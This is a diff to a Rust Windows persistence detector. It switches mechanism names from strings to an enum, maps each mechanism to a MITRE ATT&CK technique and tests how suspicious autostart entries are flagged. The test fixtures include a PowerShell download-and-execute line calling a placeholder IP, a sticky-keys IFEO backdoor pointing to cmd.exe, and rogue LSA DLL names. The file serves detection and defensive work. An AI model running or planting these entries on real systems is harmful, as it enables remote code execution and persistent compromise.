@@ -13,47 +13,52 @@
 //! Notify, WOW64 Run keys) rely on persist.rs's generic path/signature signals.
 use crate::persist::GateHit;
 use crate::trust::{is_masquerade, is_under_windows_tree, is_user_writable_path};
-use cairn_core::record::PersistenceRecord;
+use cairn_core::record::{Mechanism, PersistenceRecord};
 use cairn_core::Severity;
 
 /// MITRE ATT&CK technique for every persistence mechanism cairn collects.
-pub fn mechanism_mitre(mechanism: &str) -> &'static str {
+pub fn mechanism_mitre(mechanism: Mechanism) -> &'static str {
     match mechanism {
-        "run_key" | "startup" | "explorer_policy_run" | "boot_execute" => "T1547.001",
-        "lsa_auth_package" => "T1547.002",
-        "time_provider" => "T1547.003",
-        "winlogon" | "winlogon_notify" | "winlogon_mpnotify" => "T1547.004",
-        "lsa_security_package" => "T1547.005",
-        "print_monitor" => "T1547.010",
-        "active_setup" => "T1547.014",
-        "service" => "T1543.003",
-        "scheduled_task" => "T1053.005",
-        "screensaver" => "T1546.002",
-        "wmi_subscription" => "T1546.003",
-        "netsh_helper" => "T1546.007",
-        "appcert_dlls" => "T1546.009",
-        "appinit_dlls" => "T1546.010",
-        "ifeo" | "silent_exit_monitor" => "T1546.012",
-        "ps_profile" => "T1546.013",
-        "com_hijack" => "T1546.015",
-        "cmd_autorun" => "T1546",
-        "office_test" => "T1137.002",
-        "logon_script" => "T1037.001",
-        "lsa_notification_package" => "T1556.002",
-        _ => "T1547",
+        Mechanism::RunKey
+        | Mechanism::Startup
+        | Mechanism::ExplorerPolicyRun
+        | Mechanism::BootExecute => "T1547.001",
+        Mechanism::LsaAuthPackage => "T1547.002",
+        Mechanism::TimeProvider => "T1547.003",
+        Mechanism::Winlogon | Mechanism::WinlogonNotify | Mechanism::WinlogonMpnotify => {
+            "T1547.004"
+        }
+        Mechanism::LsaSecurityPackage => "T1547.005",
+        Mechanism::PrintMonitor => "T1547.010",
+        Mechanism::ActiveSetup => "T1547.014",
+        Mechanism::Service => "T1543.003",
+        Mechanism::ScheduledTask => "T1053.005",
+        Mechanism::Screensaver => "T1546.002",
+        Mechanism::WmiSubscription => "T1546.003",
+        Mechanism::NetshHelper => "T1546.007",
+        Mechanism::AppcertDlls => "T1546.009",
+        Mechanism::AppinitDlls => "T1546.010",
+        Mechanism::Ifeo | Mechanism::SilentExitMonitor => "T1546.012",
+        Mechanism::PsProfile => "T1546.013",
+        Mechanism::ComHijack => "T1546.015",
+        Mechanism::CmdAutorun => "T1546",
+        Mechanism::OfficeTest => "T1137.002",
+        Mechanism::LogonScript => "T1037.001",
+        Mechanism::LsaNotificationPackage => "T1556.002",
+        Mechanism::Other => "T1547",
     }
 }
 
 /// Mechanisms where Windows ships no entries: any value is worth review.
-const ABSENT_BY_DEFAULT: &[&str] = &[
-    "appinit_dlls",
-    "appcert_dlls",
-    "cmd_autorun",
-    "silent_exit_monitor",
-    "office_test",
-    "logon_script",
-    "explorer_policy_run",
-    "winlogon_mpnotify",
+const ABSENT_BY_DEFAULT: &[Mechanism] = &[
+    Mechanism::AppinitDlls,
+    Mechanism::AppcertDlls,
+    Mechanism::CmdAutorun,
+    Mechanism::SilentExitMonitor,
+    Mechanism::OfficeTest,
+    Mechanism::LogonScript,
+    Mechanism::ExplorerPolicyRun,
+    Mechanism::WinlogonMpnotify,
 ];
 
 /// Stock LSA Authentication Packages.
@@ -150,28 +155,28 @@ fn is_stock_entry(p: &PersistenceRecord) -> bool {
     // is not the stock print monitor.
     let stock_file =
         |list: &[&str]| list.contains(&file_name(path).as_str()) && is_under_windows_tree(path);
-    match p.mechanism.as_str() {
-        "lsa_auth_package" => LSA_AUTH_DEFAULTS.contains(&item.as_str()),
-        "lsa_security_package" => LSA_SECURITY_DEFAULTS.contains(&item.as_str()),
-        "lsa_notification_package" => LSA_NOTIFICATION_DEFAULTS.contains(&item.as_str()),
-        "boot_execute" => item.starts_with("autocheck autochk"),
-        "netsh_helper" => stock_file(NETSH_DEFAULTS),
-        "print_monitor" => stock_file(PRINT_MONITOR_DEFAULTS),
-        "time_provider" => stock_file(TIME_PROVIDER_DEFAULTS),
+    match p.mechanism {
+        Mechanism::LsaAuthPackage => LSA_AUTH_DEFAULTS.contains(&item.as_str()),
+        Mechanism::LsaSecurityPackage => LSA_SECURITY_DEFAULTS.contains(&item.as_str()),
+        Mechanism::LsaNotificationPackage => LSA_NOTIFICATION_DEFAULTS.contains(&item.as_str()),
+        Mechanism::BootExecute => item.starts_with("autocheck autochk"),
+        Mechanism::NetshHelper => stock_file(NETSH_DEFAULTS),
+        Mechanism::PrintMonitor => stock_file(PRINT_MONITOR_DEFAULTS),
+        Mechanism::TimeProvider => stock_file(TIME_PROVIDER_DEFAULTS),
         _ => false,
     }
 }
 
-fn is_default_list_mechanism(m: &str) -> bool {
+fn is_default_list_mechanism(m: Mechanism) -> bool {
     matches!(
         m,
-        "lsa_auth_package"
-            | "lsa_security_package"
-            | "lsa_notification_package"
-            | "boot_execute"
-            | "netsh_helper"
-            | "print_monitor"
-            | "time_provider"
+        Mechanism::LsaAuthPackage
+            | Mechanism::LsaSecurityPackage
+            | Mechanism::LsaNotificationPackage
+            | Mechanism::BootExecute
+            | Mechanism::NetshHelper
+            | Mechanism::PrintMonitor
+            | Mechanism::TimeProvider
     )
 }
 
@@ -212,7 +217,7 @@ pub(crate) fn suspicious_script_markers(text: &str) -> Vec<&'static str> {
 /// backdoors and PowerShell profiles. None = no mechanism-specific signal (the generic
 /// path/signature signals in persist.rs still apply).
 pub(crate) fn asep_signal(p: &PersistenceRecord) -> Option<GateHit> {
-    let m = p.mechanism.as_str();
+    let m = p.mechanism;
     let mitre = mechanism_mitre(m);
     let target = p
         .binary_path
@@ -220,7 +225,7 @@ pub(crate) fn asep_signal(p: &PersistenceRecord) -> Option<GateHit> {
         .or(p.command.as_deref())
         .unwrap_or("-");
 
-    if m == "ifeo" {
+    if m == Mechanism::Ifeo {
         let image = p.value.as_deref().unwrap_or("").to_ascii_lowercase();
         if ACCESSIBILITY_BINARIES.contains(&image.as_str()) {
             return Some(GateHit {
@@ -237,7 +242,7 @@ pub(crate) fn asep_signal(p: &PersistenceRecord) -> Option<GateHit> {
         return None;
     }
 
-    if m == "ps_profile" {
+    if m == Mechanism::PsProfile {
         let markers = suspicious_script_markers(p.command.as_deref().unwrap_or(""));
         if markers.is_empty() {
             return None;
@@ -288,29 +293,29 @@ pub(crate) fn asep_signal(p: &PersistenceRecord) -> Option<GateHit> {
     None
 }
 
-fn absent_label(m: &str) -> &'static str {
+fn absent_label(m: Mechanism) -> &'static str {
     match m {
-        "appinit_dlls" => "AppInit_DLLs 載入 DLL",
-        "appcert_dlls" => "AppCertDlls 載入 DLL",
-        "cmd_autorun" => "cmd.exe AutoRun 指令",
-        "silent_exit_monitor" => "SilentProcessExit 監視程式",
-        "office_test" => "Office Test 機碼載入 DLL",
-        "logon_script" => "使用者登入腳本",
-        "explorer_policy_run" => "原則 Run 機碼自動執行",
-        "winlogon_mpnotify" => "Winlogon MPNotify 程式",
+        Mechanism::AppinitDlls => "AppInit_DLLs 載入 DLL",
+        Mechanism::AppcertDlls => "AppCertDlls 載入 DLL",
+        Mechanism::CmdAutorun => "cmd.exe AutoRun 指令",
+        Mechanism::SilentExitMonitor => "SilentProcessExit 監視程式",
+        Mechanism::OfficeTest => "Office Test 機碼載入 DLL",
+        Mechanism::LogonScript => "使用者登入腳本",
+        Mechanism::ExplorerPolicyRun => "原則 Run 機碼自動執行",
+        Mechanism::WinlogonMpnotify => "Winlogon MPNotify 程式",
         _ => "非預設自動執行項目",
     }
 }
 
-fn default_list_label(m: &str) -> &'static str {
+fn default_list_label(m: Mechanism) -> &'static str {
     match m {
-        "lsa_auth_package" => "非預設 LSA 驗證套件",
-        "lsa_security_package" => "非預設 LSA 安全性套件",
-        "lsa_notification_package" => "非預設密碼篩選器",
-        "boot_execute" => "非預設 BootExecute 程式",
-        "netsh_helper" => "非預設 netsh helper DLL",
-        "print_monitor" => "非預設列印監視器",
-        "time_provider" => "非預設時間提供者",
+        Mechanism::LsaAuthPackage => "非預設 LSA 驗證套件",
+        Mechanism::LsaSecurityPackage => "非預設 LSA 安全性套件",
+        Mechanism::LsaNotificationPackage => "非預設密碼篩選器",
+        Mechanism::BootExecute => "非預設 BootExecute 程式",
+        Mechanism::NetshHelper => "非預設 netsh helper DLL",
+        Mechanism::PrintMonitor => "非預設列印監視器",
+        Mechanism::TimeProvider => "非預設時間提供者",
         _ => "非預設自動執行項目",
     }
 }
@@ -320,13 +325,13 @@ mod tests {
     use super::*;
 
     fn rec(
-        mechanism: &str,
+        mechanism: Mechanism,
         value: &str,
         command: &str,
         binary_path: Option<&str>,
     ) -> PersistenceRecord {
         PersistenceRecord {
-            mechanism: mechanism.into(),
+            mechanism,
             location: format!(r"HKLM\...\{mechanism}"),
             value: Some(value.into()),
             command: Some(command.into()),
@@ -343,11 +348,16 @@ mod tests {
         for pkg in [
             "kerberos", "msv1_0", "schannel", "wdigest", "tspkg", "pku2u", "cloudap",
         ] {
-            let p = rec("lsa_security_package", "Security Packages", pkg, None);
+            let p = rec(
+                Mechanism::LsaSecurityPackage,
+                "Security Packages",
+                pkg,
+                None,
+            );
             assert!(asep_signal(&p).is_none(), "{pkg}");
         }
         let p = rec(
-            "lsa_auth_package",
+            Mechanism::LsaAuthPackage,
             "Authentication Packages",
             "msv1_0",
             None,
@@ -359,7 +369,7 @@ mod tests {
     #[test]
     fn unknown_security_package_is_flagged() {
         let p = rec(
-            "lsa_security_package",
+            Mechanism::LsaSecurityPackage,
             "Security Packages",
             "mimilib",
             Some(r"C:\Windows\System32\mimilib.dll"),
@@ -372,7 +382,7 @@ mod tests {
     #[test]
     fn unsigned_non_stock_entry_is_high() {
         let mut p = rec(
-            "lsa_notification_package",
+            Mechanism::LsaNotificationPackage,
             "Notification Packages",
             "evilfilter",
             Some(r"C:\Windows\System32\evilfilter.dll"),
@@ -385,9 +395,19 @@ mod tests {
 
     #[test]
     fn stock_boot_execute_is_not_flagged_but_extra_is() {
-        let p = rec("boot_execute", "BootExecute", "autocheck autochk *", None);
+        let p = rec(
+            Mechanism::BootExecute,
+            "BootExecute",
+            "autocheck autochk *",
+            None,
+        );
         assert!(asep_signal(&p).is_none());
-        let p = rec("boot_execute", "BootExecute", r"\??\C:\Temp\x.exe", None);
+        let p = rec(
+            Mechanism::BootExecute,
+            "BootExecute",
+            r"\??\C:\Temp\x.exe",
+            None,
+        );
         assert_eq!(asep_signal(&p).unwrap().mitre, "T1547.001");
     }
 
@@ -395,7 +415,7 @@ mod tests {
     #[test]
     fn stock_name_outside_windows_is_flagged() {
         let p = rec(
-            "print_monitor",
+            Mechanism::PrintMonitor,
             "Local Port",
             r"C:\Users\Public\localspl.dll",
             Some(r"C:\Users\Public\localspl.dll"),
@@ -404,7 +424,7 @@ mod tests {
         assert_eq!(hit.severity, Severity::High, "user-writable path => High");
         assert_eq!(hit.mitre, "T1547.010");
         let ok = rec(
-            "print_monitor",
+            Mechanism::PrintMonitor,
             "Local Port",
             "localspl.dll",
             Some(r"C:\Windows\System32\localspl.dll"),
@@ -415,19 +435,24 @@ mod tests {
     #[test]
     fn any_absent_by_default_entry_is_flagged() {
         for m in ABSENT_BY_DEFAULT {
-            let p = rec(m, "x", r"C:\Tools\x.exe", Some(r"C:\Tools\x.exe"));
+            let p = rec(*m, "x", r"C:\Tools\x.exe", Some(r"C:\Tools\x.exe"));
             let hit = asep_signal(&p).unwrap_or_else(|| panic!("{m} must gate"));
-            assert_eq!(hit.mitre, mechanism_mitre(m));
+            assert_eq!(hit.mitre, mechanism_mitre(*m));
         }
     }
 
     #[test]
     fn ifeo_on_accessibility_binary_is_t1546_008() {
-        let p = rec("ifeo", "sethc.exe", r"C:\Windows\System32\cmd.exe", None);
+        let p = rec(
+            Mechanism::Ifeo,
+            "sethc.exe",
+            r"C:\Windows\System32\cmd.exe",
+            None,
+        );
         let hit = asep_signal(&p).unwrap();
         assert_eq!(hit.mitre, "T1546.008");
         assert_eq!(hit.severity, Severity::High);
-        let p = rec("ifeo", "notepad.exe", r"C:\Tools\npp.exe", None);
+        let p = rec(Mechanism::Ifeo, "notepad.exe", r"C:\Tools\npp.exe", None);
         assert!(
             asep_signal(&p).is_none(),
             "generic IFEO handled by persist.rs"
@@ -437,14 +462,14 @@ mod tests {
     #[test]
     fn ps_profile_judged_by_content() {
         let benign = rec(
-            "ps_profile",
+            Mechanism::PsProfile,
             "profile.ps1",
             "Set-Alias ll Get-ChildItem",
             None,
         );
         assert!(asep_signal(&benign).is_none());
         let bad = rec(
-            "ps_profile",
+            Mechanism::PsProfile,
             "profile.ps1",
             "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')",
             None,
@@ -458,11 +483,11 @@ mod tests {
     #[test]
     fn generic_mechanisms_have_no_specific_signal() {
         for m in [
-            "active_setup",
-            "com_hijack",
-            "screensaver",
-            "winlogon_notify",
-            "run_key",
+            Mechanism::ActiveSetup,
+            Mechanism::ComHijack,
+            Mechanism::Screensaver,
+            Mechanism::WinlogonNotify,
+            Mechanism::RunKey,
         ] {
             let p = rec(
                 m,
@@ -481,13 +506,13 @@ mod tests {
         use cairn_core::record::Record;
         use cairn_core::traits::Analyzer;
         let bad = rec(
-            "lsa_security_package",
+            Mechanism::LsaSecurityPackage,
             "Security Packages",
             "mimilib",
             Some(r"C:\Windows\System32\mimilib.dll"),
         );
         let good = rec(
-            "lsa_security_package",
+            Mechanism::LsaSecurityPackage,
             "Security Packages",
             "kerberos",
             Some(r"C:\Windows\System32\kerberos.dll"),
@@ -504,36 +529,8 @@ mod tests {
 
     #[test]
     fn every_mechanism_has_a_specific_technique() {
-        for m in [
-            "run_key",
-            "service",
-            "scheduled_task",
-            "wmi_subscription",
-            "ifeo",
-            "startup",
-            "winlogon",
-            "explorer_policy_run",
-            "boot_execute",
-            "lsa_auth_package",
-            "lsa_security_package",
-            "lsa_notification_package",
-            "time_provider",
-            "winlogon_notify",
-            "winlogon_mpnotify",
-            "print_monitor",
-            "active_setup",
-            "screensaver",
-            "netsh_helper",
-            "appcert_dlls",
-            "appinit_dlls",
-            "silent_exit_monitor",
-            "com_hijack",
-            "cmd_autorun",
-            "office_test",
-            "logon_script",
-            "ps_profile",
-        ] {
-            assert!(mechanism_mitre(m).starts_with('T'), "{m}");
+        for m in Mechanism::ALL {
+            assert!(mechanism_mitre(*m).starts_with('T'), "{m}");
         }
     }
 }
